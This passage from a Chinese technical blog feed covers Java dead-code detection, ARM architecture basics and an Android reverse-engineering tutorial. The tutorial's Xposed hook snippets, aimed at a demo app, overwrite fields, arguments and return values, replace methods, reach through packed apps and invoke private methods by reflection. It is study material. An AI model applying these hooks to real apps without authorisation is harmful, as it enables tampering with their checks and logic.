class="hljs-comment">// 满足if，跳转到目标语句，同时目标语句设置已被访问，这里跳过了不可达语句</span><br>                           current = edge.getTarget();<br>                           visited.add(current);<br>                       &#125;<br>                   &#125;<br>               &#125;<br>           &#125;<br>           <span class="hljs-comment">// switch 分支不可达</span><br>           <span class="hljs-keyword">if</span> (current <span class="hljs-keyword">instanceof</span> SwitchStmt s) &#123;<br>               <span class="hljs-type">Value</span> <span class="hljs-variable">ConditionValue</span> <span class="hljs-operator">=</span> ConstantPropagation.evaluate(s.getVar(), constants.getInFact(current));<br>               <span class="hljs-keyword">if</span>(ConditionValue.isConstant())&#123;<br>                   <span class="hljs-comment">// 判断是否有可达分支</span><br>                   <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                   <span class="hljs-comment">// 获取所有的 case</span><br>                   <span class="hljs-keyword">for</span> (Pair&lt;Integer, Stmt&gt; pair : s.getCaseTargets())&#123;<br>                       <span class="hljs-keyword">if</span> (ConditionValue.getConstant() == pair.first()) &#123;<br>                           flag = <span class="hljs-literal">true</span>;<br>                           current = pair.second();<br>                           visited.add(current);<br>                       &#125;<br>                   &#125;<br>                   <span class="hljs-comment">// 如果没有可达分支，将 default 加入队列</span><br>                   <span class="hljs-keyword">if</span> (!flag) &#123;<br>                       current = s.getDefaultTarget();<br>                       visited.add(current);<br>                   &#125;<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// 无用赋值</span><br>           <span class="hljs-keyword">if</span>(current <span class="hljs-keyword">instanceof</span> AssignStmt&lt;?,?&gt; s &amp;&amp; s.getLValue() <span class="hljs-keyword">instanceof</span> Var <span class="hljs-keyword">var</span>)&#123;<br>               <span class="hljs-comment">// 如果当前变量不在活跃变量中，且右值没有副作用，这个时候才能进行删除</span><br>               <span class="hljs-keyword">if</span> (!liveVars.getResult(s).contains(<span class="hljs-keyword">var</span>) &amp;&amp; hasNoSideEffect(s.getRValue())) &#123;<br>                   visited.remove(s);<br>               &#125;<br>           &#125;<br>           <span class="hljs-comment">// 将所有未访问的后继节点添加到队列中</span><br>           <span class="hljs-keyword">for</span> (Stmt succ : cfg.getSuccsOf(current)) &#123;<br>               <span class="hljs-keyword">if</span> (!visited.contains(succ)) &#123;<br>                   stmtQueue.add(succ);<br>                   visited.add(succ);<br>               &#125;<br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">// 去除所有可达语句，剩下的就是不可达语句，注意去除出口节点</span><br>       deadCode.addAll(cfg.getNodes());<br>       deadCode.removeAll(visited);<br>       deadCode.remove(cfg.getExit());<br>       <span class="hljs-keyword">return</span> deadCode;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是通过 CFG 来按照程序的逻辑遍历所以可达的语句，然后标记遍历过的语句，最后通过存储着所有语句的 CFG 删去遍历过的语句 visited 来获得所有的不可达语句。</p><p>​这里对 <code>for (Stmt succ : cfg.getSuccsOf(current))</code> 中 <code>visited.add(succ)</code> 将所有为访问的后继节点添加到队列中有个解释，这里添加所有的后继节点不会添加到不可达节点，因为上面的方法要么判断 if，switch语句，要么判断赋值语句，对于if，switch的判断是可达的，然后它现在的语句(current)再判断后会直接跳转到正确的目标中，所以略过了不可达语句，同时若是对于赋值语句添加了不可达语句，之后再分析这一句时也会通过对于无用赋值的判定进行删除。</p><p>​由上面也可以看出对于不可达代码和无用赋值的不同处理方法。<strong>不可达代码</strong>就是通过跳转到正确的目标来略去不可达的语句，而<strong>无用赋值</strong>则是通过先将所有后继加入到visited的集合中，先假定它可达，然后再分析这一个语句时探测其本质，不可达就进行删除。最后通过这两种方案获得了所有可达的集合visited，然后再从总数中减去即可获得所有不可达语句。</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ARM汇编</title>
    <link href="/posts/7dbaa5b1.html"/>
    <url>/posts/7dbaa5b1.html</url>
    
    <content type="html"><![CDATA[<h1 id="基础概念"><a class="markdownIt-Anchor" href="#基础概念"></a> 基础概念</h1><p>​ARM 架构在其发展过程中经历了多个版本的更新，每个版本都可能引入新的特性和改进。ARMv8 是 ARM 架构的一个重要版本，它引入了 64 位执行状态(AArch64)，这是 ARM 架构首次支持 64 位处理器和 64 位地址空间。</p><h2 id="架构"><a class="markdownIt-Anchor" href="#架构"></a> 架构</h2><p>​拿Android来举例，它存在ARMv7，ARMv8两种架构的指令，这是两种架构，而不是x86,x64之类的指令集。所以ARMv7和ARMv8都有 AArch32 执行状态(它对应着x86)，而ARMv8 还支持 AArch64 执行状态。</p><ul><li>在 32 位 ARM 状态(AArch32)下，有 16 个通用寄存器(r0 到 r15)。其中 r13 通常作为堆栈指针(sp)，r14 作为链接寄存器(lr)，r15 作为程序计数器(pc)。</li><li>在 64 位 ARM 状态(AArch64)下，有 31 个通用寄存器(x0 到 x30)。这些寄存器都是 64 位的，可以处理更大的数据量。此外，还有一些特殊寄存器，如程序计数器(pc)，堆栈指针(sp)和零寄存器(xzr)。</li></ul><h2 id="模式"><a class="markdownIt-Anchor" href="#模式"></a> 模式</h2><p>​ARM 模式和 Thumb 模式是 ARM 架构中的两种不同的指令集模式，它们存在于 ARMv7 和 ARMv8 的 AArch32 状态中。</p><p>在 ARMv7 架构中：</p><ul><li>ARM 模式提供了丰富的 32 位指令集。</li><li>Thumb 模式提供了主要为 16 位的指令集，以提高代码密度。</li><li>还有一个 Thumb-2 模式，它是 ARM 和 Thumb 的混合模式，提供了高代码密度和丰富的指令集。</li></ul><p>在 ARMv8 架构中：</p><ul><li>AArch32 状态支持 ARM 模式、Thumb 模式和 Thumb-2 模式。</li><li>AArch64 状态是新引入的 64 位执行状态，它有自己的新的 64 位指令集。此外，AArch64 状态也引入了新的 32 位指令集(相当于 AArch64 的 Thumb 模式)，以提高代码密度。</li></ul><h1 id="armv7"><a class="markdownIt-Anchor" href="#armv7"></a> ARMv7</h1><p>具体参考 -&gt; <a href="https://www.cnblogs.com/hilfloser/p/10516610.html">ARM汇编基础 - hilfloser - 博客园 (cnblogs.com)</a></p><h1 id="armv8"><a class="markdownIt-Anchor" href="#armv8"></a> ARMv8</h1><p>具体参考 -&gt; <a href="https://www.lyldalek.top/article/arm">https://www.lyldalek.top/article/arm</a></p>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门(3)</title>
    <link href="/posts/bc0e5805.html"/>
    <url>/posts/bc0e5805.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>hook专题</p></blockquote><h1 id="xposed"><a class="markdownIt-Anchor" href="#xposed"></a> Xposed</h1><p>配置教程 -&gt; <a href="https://www.52pojie.cn/thread-1740944-1-1.html">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编… - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>用自己实现的<strong>app_process</strong>替换掉了系统原本提供的<strong>app_process</strong>，加载一个额外的jar包，入口从原来的： <strong>com.android.internal.osZygoteInit.main()被替换成了： de.robv.android.xposed.XposedBridge.main()</strong>，创建的Zygote进程就变成Hook的Zygote进程了，从而完成对zygote进程及其创建的Dalvik/ART虚拟机的劫持(zytoge注入)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402260801817.png" alt="image-20240226080124647" /></p><h2 id="常用api"><a class="markdownIt-Anchor" href="#常用api"></a> 常用API</h2><p>​这里通过 Android Studio的 Logcat 打印日志来对程序的方法进行分析。一个空白的文档，可以在这个上面进行开发 -&gt; <a href="https://github.com/lz-ang/XposedSample">GitHub - lz-ang/XposedSample: Xposed框架在项目中使用</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hook</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IXposedHookLoadPackage</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-keyword">if</span>(!loadPackageParam.packageName.equals(<span class="hljs-string">&quot;com.zj.wuaipojie&quot;</span>))&#123; <span class="hljs-comment">// 过滤出目标的程序的包</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//之后的hook代码就是在这个框架中填写</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook-变量"><a class="markdownIt-Anchor" href="#hook-变量"></a> hook 变量</h3><p>静态变量与实例变量：</p><ul><li>静态变量(static)：类被初始化，同步进行初始化</li><li>非静态变量：类需要被实例化(产生一个对象的时候)，进行初始化</li></ul><h4 id="静态变量"><a class="markdownIt-Anchor" href="#静态变量"></a> 静态变量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> XposedHelpers.findClass(<span class="hljs-string">&quot;类名&quot;</span>, loadPackageParam.classLoader);  <br>XposedHelpers.setStaticObjectField(clazz, <span class="hljs-string">&quot;变量名&quot;</span>, <span class="hljs-string">&quot;String使用Object&quot;</span>);<br>Log.e(<span class="hljs-string">&quot;tag&quot;</span>, XposedHelpers.getStaticObjectField(clazz, <span class="hljs-string">&quot;变量名&quot;</span>).toString());<br><span class="hljs-comment">// 这里hook后打印可以看出效果，按时其他方法调用这个变量可能在hook之前，存在没有修改的情况</span><br></code></pre></td></tr></table></figure><h4 id="实例变量"><a class="markdownIt-Anchor" href="#实例变量"></a> 实例变量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> XposedHelpers.findClass(<span class="hljs-string">&quot;类名&quot;</span>, classLoader);  <br>XposedBridge.hookAllConstructors(clazz, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<span class="hljs-comment">// hook所有构造函数(初始化变量)</span><br>     <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.afterHookedMethod(param);  <br>        <span class="hljs-comment">//param.thisObject获取当前所属的对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ob</span> <span class="hljs-operator">=</span> param.thisObject;  <br>        XposedHelpers.setIntField(ob,<span class="hljs-string">&quot;变量名&quot;</span>,<span class="hljs-number">9999</span>);  <br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="hook-构造函数"><a class="markdownIt-Anchor" href="#hook-构造函数"></a> hook 构造函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookConstructor(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>, classLoader, String.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<span class="hljs-comment">//这是有参构造函数，无参的把String.class的参数去掉即可</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-built_in">super</span>.beforeHookedMethod(param);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-built_in">super</span>.afterHookedMethod(param);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="hook-普通方法"><a class="markdownIt-Anchor" href="#hook-普通方法"></a> hook 普通方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;类名&quot;</span>, loadPackageParam.classLoader, <span class="hljs-string">&quot;方法名&quot;</span>, String.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<span class="hljs-comment">//依次为hook的类名，类加载器，方法名，参数，jar包引用</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<span class="hljs-comment">//主要用来读取和修改参数</span><br>        <span class="hljs-built_in">super</span>.beforeHookedMethod(param);<br>        Log.e(<span class="hljs-string">&quot;tag&quot;</span>, param.args[<span class="hljs-number">0</span>].toString());<span class="hljs-comment">//eroor log，更显著</span><br>        <span class="hljs-comment">//XposedBridge.log(param.args[0].toString());// 另一种log的方法</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new value&quot;</span>;<br>        param.args[<span class="hljs-number">0</span>] = arg;<span class="hljs-comment">//修改参数</span><br>        Log.e(<span class="hljs-string">&quot;tag&quot;</span>,param.args[<span class="hljs-number">0</span>].toString());<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<span class="hljs-comment">//主要用来修改返回值以及查看修改是否生效</span><br>        <span class="hljs-built_in">super</span>.afterHookedMethod(param);<br>        Log.e(<span class="hljs-string">&quot;tag&quot;</span>,param.getResult().toString());<br>        param.setResult(<span class="hljs-string">&quot;tag&quot;</span>);<span class="hljs-comment">//修改返回值</span><br>        Log.e(<span class="hljs-string">&quot;tag&quot;</span>,param.getResult().toString());<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="hook-复杂自定义参数"><a class="markdownIt-Anchor" href="#hook-复杂自定义参数"></a> hook 复杂&amp;自定义参数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> loadPackageParam.classLoader.loadClass(<span class="hljs-string">&quot;类名&quot;</span>);<br>XposedBridge.hookAllMethods(clazz, <span class="hljs-string">&quot;方法名&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-built_in">super</span>.beforeHookedMethod(param);<br><span class="hljs-comment">// 同上修改</span><br>        &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="hook-替换函数"><a class="markdownIt-Anchor" href="#hook-替换函数"></a> hook 替换函数</h3><p>​这里指替换函数运行，也即hook之前的函数不再运行，而只运行hook之后的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classLoader.loadClass(<span class="hljs-string">&quot;类名&quot;</span>)<br>XposedBridge.hookAllMethods(clazz, <span class="hljs-string">&quot;方法名&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodReplacement</span>() &#123;  <br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">replaceHookedMethod</span><span class="hljs-params">(MethodHookParam methodHookParam)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="hook-加固通杀"><a class="markdownIt-Anchor" href="#hook-加固通杀"></a> hook 加固通杀</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(Application.class, <span class="hljs-string">&quot;attach&quot;</span>, Context.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (Context) param.args[<span class="hljs-number">0</span>];  <br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> context.getClassLoader();<br>        <span class="hljs-comment">//hook逻辑在这里面写。可以将 hook 普通函数的 Hook 方法填在这里</span><br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="hook-multidex方法"><a class="markdownIt-Anchor" href="#hook-multidex方法"></a> hook multiDex方法</h3><p>​一个文件中存在多个dex的情况，一个dex中最多包含65535个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(Application.class, <span class="hljs-string">&quot;attach&quot;</span>, Context.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        ClassLoader cl= ((Context)param.args[<span class="hljs-number">0</span>]).getClassLoader();  <br>        Class&lt;?&gt; hookclass=<span class="hljs-literal">null</span>;  <br>        <span class="hljs-keyword">try</span> &#123;  <span class="hljs-comment">//这里是根据classLoader来寻找指定类名</span><br>            hookclass=cl.loadClass(<span class="hljs-string">&quot;类名&quot;</span>);  <br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;  <br>            Log.e(<span class="hljs-string">&quot;zj2595&quot;</span>,<span class="hljs-string">&quot;未找到类&quot;</span>,e);  <br>            <span class="hljs-keyword">return</span>;        <br>        &#125;  <br>        XposedHelpers.findAndHookMethod(hookclass, <span class="hljs-string">&quot;方法名&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>            <span class="hljs-meta">@Override</span>  <br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>            &#125;        <br>        &#125;);  <br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="主动调用"><a class="markdownIt-Anchor" href="#主动调用"></a> 主动调用</h3><p>​通过hook主动调用程序的方法</p><h4 id="静态方法"><a class="markdownIt-Anchor" href="#静态方法"></a> 静态方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> XposedHelpers.findClass(<span class="hljs-string">&quot;类名&quot;</span>, loadPackageParam.classLoader);<br>XposedHelpers.callStaticMethod(clazz, <span class="hljs-string">&quot;方法名&quot;</span>, 参数(非必须));<br></code></pre></td></tr></table></figure><h4 id="实例方法"><a class="markdownIt-Anchor" href="#实例方法"></a> 实例方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> XposedHelpers.findClass(<span class="hljs-string">&quot;类名&quot;</span>, loadPackageParam.classLoader);<br>XposedHelpers.callMethod(clazz.newInstance(), <span class="hljs-string">&quot;方法名&quot;</span>, 参数(非必须));<br></code></pre></td></tr></table></figure><h3 id="hook-内部类"><a class="markdownIt-Anchor" href="#hook-内部类"></a> hook 内部类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader, <span class="hljs-string">&quot;方法名&quot;</span>, String.class,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123; <span class="hljs-comment">// 通过 $ 拼接上内部类名</span><br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.beforeHookedMethod(param); <br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="反射大法"><a class="markdownIt-Anchor" href="#反射大法"></a> 反射大法</h3><p>​我认为反射就是通过底层的类影响上层的类，这里就是在内部类中主动调用上层的一个实例方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> XposedHelpers.findClass(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>, lpparam.classLoader);<br>XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo$InnerClass&quot;</span>, lpparam.classLoader, <span class="hljs-string">&quot;innerFunc&quot;</span>, String.class,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.beforeHookedMethod(param);  <br>        <span class="hljs-comment">// 第一步找到类</span><br>        <span class="hljs-comment">// 找到方法，如果是私有方法就要setAccessible设置访问权限</span><br>        <span class="hljs-comment">// invoke主动调用或者set修改值(变量)</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">democlass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>, <span class="hljs-literal">false</span>, loadPackageParam.classLoader);  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">demomethod</span> <span class="hljs-operator">=</span> democlass.getDeclaredMethod(<span class="hljs-string">&quot;refl&quot;</span>);  <br>        demomethod.setAccessible(<span class="hljs-literal">true</span>);  <br>        demomethod.invoke(clazz.newInstance()); <span class="hljs-comment">//实例化 </span><br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="遍历所有类下所有方法"><a class="markdownIt-Anchor" href="#遍历所有类下所有方法"></a> 遍历所有类下所有方法</h3><p>​通常用来查看堆栈调用关系，从而理清楚调用逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="hljs-string">&quot;loadClass&quot;</span>, String.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.afterHookedMethod(param);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> (Class) param.getResult();  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">clazzName</span> <span class="hljs-operator">=</span> clazz.getName();  <br>        <span class="hljs-comment">//排除非包名的类  </span><br>        <span class="hljs-keyword">if</span>(clazzName.contains(<span class="hljs-string">&quot;com.zj.wuaipojie&quot;</span>))&#123;  <br>            Method[] mds = clazz.getDeclaredMethods();  <br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span>;i&lt;mds.length;i++)&#123;  <br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Method</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> mds[i];  <br>                <span class="hljs-type">int</span> <span class="hljs-variable">mod</span> <span class="hljs-operator">=</span> mds[i].getModifiers();  <br>                <span class="hljs-comment">//去除抽象、native、接口方法  </span><br>                <span class="hljs-keyword">if</span>(!Modifier.isAbstract(mod)  <br>                    &amp;&amp; !Modifier.isNative(mod)  <br>                    &amp;&amp;!Modifier.isAbstract(mod))&#123;  <br>                    XposedBridge.hookMethod(mds[i], <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>                        <span class="hljs-meta">@Override</span>  <br>                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>                            <span class="hljs-built_in">super</span>.beforeHookedMethod(param);  <br>                            Log.d(<span class="hljs-string">&quot;Tag&quot;</span>, md.toString());  <br>                        &#125;  <br>                    &#125;);  <br>                &#125;  <br><br>           &#125;  <br>        &#125;  <br><br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="xposed-妙用"><a class="markdownIt-Anchor" href="#xposed-妙用"></a> Xposed 妙用</h3><h4 id="字符串赋值定位"><a 